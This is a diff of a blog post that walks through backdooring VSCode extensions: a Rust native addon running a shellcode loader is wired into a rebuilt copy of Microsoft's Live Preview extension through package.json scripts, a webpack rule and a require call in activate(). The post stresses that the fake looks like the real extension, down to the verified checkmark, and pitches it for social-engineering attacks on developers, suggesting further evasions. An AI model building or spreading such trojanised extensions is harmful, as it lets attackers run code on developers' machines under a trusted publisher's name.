@@ -1,5 +1,8 @@
 # Sinister VSIx - Experimenting with C++, Node JS and Electron till I lose my mind
 
+[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/whokilleddb)
+
+
 ![](https://pyxis.nymag.com/v1/imgs/595/75c/02221a3d3580bab3d23fc672e9909c4890-11-sinister-six.2x.h473.w710.jpg)
 
 This blog serves as a journal of sorts to record the research process which went behind backdooring electron applications and all the problems along the way. Before we talk about the main crux of the blog, it is important to have some context and get some terminologies right.
@@ -50,7 +53,7 @@ NODE_MODULE(NODE_GYP_MODULE_NAME, Initialize)
 }  // namespace demo 
 ```
 
-Technically, this _should_ work as a starting point. Infact, lets write a simple program ourselves to test this out. 
+Technically, this _should_ work as a starting point. In fact, lets write a simple program ourselves to test this out. 
 
 ```cc
 // hello_world.cc
@@ -245,7 +248,7 @@ export function deactivate() {}
 
 ```
 
-We create a `sayhi()` function which essentially pops up a messaage box by calling the `MessageBoxA` winapi from `user32.dll` 
+We create a `sayhi()` function which essentially pops up a message box by calling the `MessageBoxA` winapi from `user32.dll` 
 
 Hitting F5 again and running the `Hello World` command pops up the message box! 
 
@@ -363,14 +366,14 @@ neon = "1.1"
 winapi = { version = "0.3", features = ["memoryapi", "processthreadsapi", "synchapi", "winnt"] }
 ```
 One very important thing to note is that the `name` parameter must match the `name` parameter in `package.json`.
-So what are we doing here? Lets talk about `Cargo.toml` file first. The template code is generated from `npm init neon` command from `neon-rs`. The `Config.toml` file essentially tells the rust compiler that we would be producing a C-compatible dynamic library(`cdylib`) - which is essentially a DLL. Infact running `file` command on linux against the `index.node` command gives us the following result:
+So what are we doing here? Lets talk about `Cargo.toml` file first. The template code is generated from `npm init neon` command from `neon-rs`. The `Config.toml` file essentially tells the rust compiler that we would be producing a C-compatible dynamic library(`cdylib`) - which is essentially a DLL. In fact running `file` command on linux against the `index.node` command gives us the following result:
 
 ```bash
 $ file index.node 
 index.node: PE32+ executable (DLL) (GUI) x86-64, for MS Windows, 8 sections
 ```
 
-Now comming to the code itself. While the code contained in the `hello()` function is your usual VirtualAlloc-CreateThread shellcode runner, the main point of interest is the `#[neon:export]` attribute. This acts similar to a `__declspec(dllexport))` in C. It essentially marks the function `hello()` as an _exported_ function in a way that it would be callable from a javascript file. Thats it!
+Now coming to the code itself. While the code contained in the `hello()` function is your usual VirtualAlloc-CreateThread shellcode runner, the main point of interest is the `#[neon:export]` attribute. This acts similar to a `__declspec(dllexport))` in C. It essentially marks the function `hello()` as an _exported_ function in a way that it would be callable from a javascript file. Thats it!
 
 Finally, we need to update the `package.json` file as:
 
@@ -450,7 +453,7 @@ to,
 ```json
 "compile": "npm run build && tsc -p ./ && move index.node out\\",
 ```
-This makes sure we compie the rust source if we havent already, then do the usual typescript _compilation_ and then we move the `index.node` addon in the same directory as the resulting `extension.js` file.
+This makes sure we compile the rust source if we haven't already, then do the usual typescript _compilation_ and then we move the `index.node` addon in the same directory as the resulting `extension.js` file.
 
 - Finally we add the following dependency:
 ```json
@@ -499,7 +502,7 @@ This should produce a `.vsix` file which we can install with:
 $ code --install-extension .\task3-0.0.1.vsix
 ```
 
-We sholuld now be able to see the extension under the VSCode Extensions tab:
+We should now be able to see the extension under the VSCode Extensions tab:
 
 ![](./imgs/task3_2.png)
 
@@ -525,45 +528,80 @@ For this task, we will be using the [microsoft's vscode-livepreview extension](h
 
 We would be using the same code base from `Task #3`. Copy the `lib.rs` into the `src/` folder. 
 
-> Note: We made a change to the function - I removed the `WaitForSingleObject` part of the program so the shellcode thread does not interfere with the normal workings of the Extension
+> Note: We made a change to the function - I removed the `WaitForSingleObject` part of the program so the shellcode thread does not interfere with the normal workings of the Extension.
 
 Next, we copy the `Cargo.toml`, but change the `name` to `live-server`. 
 
 Now we need to update the `scripts` portion of the `package.json` to:
 
 ```json
-"cargo-build": "cargo build --message-format=json-render-diagnostics > cargo.log",
-"cross-build": "cross build --message-format=json-render-diagnostics > cross.log",
-"postcargo-build": "neon dist < cargo.log",
-"postcross-build": "neon dist -m /target < cross.log",
-"debug": "npm run cargo-build --",
-"build": "npm run cargo-build -- --release",
-"cross": "npm run cross-build -- --release",
-"compile": "npm run build && node build/tools/codicon_copy.js && tsc -p ./ && move index.node out\\",
-"watch": "node build/tools/codicon_copy.js && tsc -watch -p ./",
-"format": "prettier ./{src,media}/**/*.{ts,css,html,js} --write",
-"test": "node ./out/test/runTest.js"
+  "cargo-build": "cargo build --message-format=json-render-diagnostics > cargo.log",
+  "cross-build": "cross build --message-format=json-render-diagnostics > cross.log",
+  "postcargo-build": "neon dist < cargo.log",
+  "postcross-build": "neon dist -m /target < cross.log",
+  "debug": "npm run cargo-build --",
+  "build": "npm run cargo-build -- --release",
+  "cross": "npm run cross-build -- --release",
+  "vscode:prepublish": "npm run build &&  copy /Y index.node src\\ && webpack --mode production",
+  "webpack": "webpack --mode development",
+  "webpack-dev": "webpack --mode development --watch",
+  "build-preview": "npx webpack-cli --mode development",
+  "patch-prerelease": "node ./scripts/applyPatchForPrerelease.js",
+  "validate-stable": "node ./scripts/validateStable.js",
+  "compile": "npm run build && node build/tools/codicon_copy.js && tsc -p ./ && move /Y index.node out\\",
+  "watch": "node build/tools/codicon_copy.js && tsc -watch -p ./",
+  "format": "prettier ./{src,media}/**/*.{ts,css,html,js} --write",
+  "test": "node ./out/test/runTest.js"
 ```
 
-We have completely removed the `webpack` stuff to save ourselves a lot of trouble. Finally we also add the following `devDependencies`: 
+We added the steps the build the `.node` binary before any of the `vscode:prepublish` stuff, and also modified the `vscode:prepublish` and `compile` scripts to make sure our binary is built before each step is carried and the addon is in the right folder. One thing you might notice is we copy the addon to the `src` folder whereas previously we were just copying it to the `out` folder. This is just to make webpack happy (touching on that in a second).
+
+We also add the following new `devDependencies`: 
 
 ```json
-"@neon-rs/cli": "0.1.82"
+"@neon-rs/cli": "0.1.82",
+"native-addon-loader": "^2.0.1"
 ```
 
-Finally, inside `src/extension.ts` file we add the following line:
+The `native-addon-loader` is also something we need to make `webpack` happy.
+
+
+Coming to `src/extension.ts` file we add the following line:
 
 ```js
 export function activate(context: vscode.ExtensionContext): void {
-	require(".").hello();
+	require("./index.node").hello();
   ...
   ...
   ...
 }
 ```
 
+Previously, we used to do a `require(".").hello();` - but webpack does not like that. At all. (I am not a JS guy at all, and I am sure these are not the best ways to deal with `webpack` but these get the job done).
 
-Now we install the required packages and create the extension with:
+Finally, we need to update the `webpack.config.js` with the following rule:
+
+```js
+module: {
+		rules: [
+			{
+				test: /\.ts$/,
+				exclude: /node_modules/,
+				use: 'ts-loader',
+			},
+			{
+				test: /\.node$/,
+				use: [
+				{
+					loader: 'native-addon-loader',
+				}
+				]
+			}
+		],
+	},
+```
+
+With this, we should have everything we need to compile our extension, which we can do with:
 
 ```bash
 $ npm install
@@ -573,3 +611,28 @@ $ vsce package --no-yarn
 
 This should produce a `live-server-0.4.15.vsix` file which when imported, looks like this:
 
+![](./imgs/task4_1.png)
+
+Opening the `task4\index.html` file and clicking on the Live Preview button in the top right corner should trigger our shellcode:
+
+![](./imgs/task4_2.png)
+
+Therefore we were able to successfully run our shellcode in the context of Visual Studio Code - Task #4 Done! 
+
+Further, installing the legitimate Live Preview extension from the marketplace, we see how minimal the differences are between the two:
+
+![](./imgs/task4_3.png)
+
+The only major difference is on the right hand column where our malicious extension shows a few more details under the _Installation_ tab but the main Extension header remains same - down to the reviews and even the the blue microsoft checkmark - making this super useful for social engineering attacks against devs. 
+
+---
+
+## Conclusions 
+
+Though this technique started as an experiment - I believe this can be a good vector for social engineering. We can further the evasions and make it more stealthy by doing things like downloading the addon at runtime, trying more experiments with the `vscode://` handler and much more - which all can be excellent exercises for someone willing to further this technique. 
+
+Till next time, don't you dare go hollow!
+
+![](https://preview.redd.it/what-is-the-er-version-of-dont-you-dare-go-hollow-v0-nywnupp902id1.jpeg?width=640&crop=smart&auto=webp&s=c75e98639aca683dd1e28f7c2f8dba8e428318c5)
+
+_PS: If you like these code-walkthroughs, consider [Buying me a coffee](https://www.buymeacoffee.com/whokilleddb) and following me on [twitter/X](https://x.com/whokilleddb). Much appreciated!_
